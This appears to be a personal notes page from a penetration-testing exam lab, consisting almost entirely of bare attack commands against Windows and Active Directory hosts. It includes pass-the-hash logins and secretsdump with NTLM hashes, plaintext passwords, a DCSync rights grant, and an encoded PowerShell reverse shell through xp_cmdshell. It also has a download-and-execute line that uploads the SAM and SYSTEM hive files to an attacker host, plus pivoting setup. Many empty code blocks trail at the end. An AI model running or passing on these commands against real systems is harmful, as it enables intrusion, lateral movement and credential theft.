[[Editing Copy Page]]

```
impacket-psexec oscp.exam/tom_admin@10.10.162.154 -hashes aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc
```

```
impacket-psexec oscp.exam/administrator@10.10.162.152 -hashes aad3b435b51404eeaad3b435b51404ee:59b280ba707d22e3ef0aa587fc29ffe5
```

```
evil-winrm -i 192.168.162.153 -u 'Eric.Wallows' -p 'EricLikesRunning800'
```

```
impacket-mssqlclient 'Eric.Wallows':EricLikesRunning800@10.10.162.154 -windows-auth
```

```
impacket-mssqlclient 'Administrator:hghgib6vHT3bVWf'@10.10.162.154 -windows-auth
```

```
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc''oscp.exam'/'tom_admin'@'10.10.162.152'
```

```
certutil -urlcache -split -f http://10.10.162.153:4445/SharpHound.exe SharpHound.exe
```

```
ssh support@192.168.162.153
```
December31

```
impacket-psexec oscp.exam/tom_admin@10.10.162.154 -hashes aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc
```

```
listener_add --addr 0.0.0.0:4445 --to 127.0.0.1:4445 --tcp
listener_list
```


```
administrator : hghgib6vHT3bVWf
```

```
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=oscp,DC=exam" -PrincipalIdentity tom_admin -Rights DCSync
```

penelope 4444

```
xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2ADIALgAxADUAMwAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

```
IEX(New-Object Net.WebClient).DownloadString('http://10.10.162.153:4445/PSUpload.ps1'); Invoke-FileUpload -Uri "http://10.10.162.153:4446/upload" -File "C:\windows.old\windows\system32\SYSTEM"; Invoke-FileUpload -Uri "http://10.10.162.153:4446/upload" -File "C:\windows.old\windows\system32\SAM"
```

```
Test-NetConnection 10.10.162.153 -Port 4444
```

```
ligolo pivot support account to ms02. Connect to mssql with admin. Get RC into MS02
```


```
Invoke-FileUpload -Uri "http://10.10.162.153:4445/upload" -File "C:\windows.old\windows\system32\SYSTEM"
```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```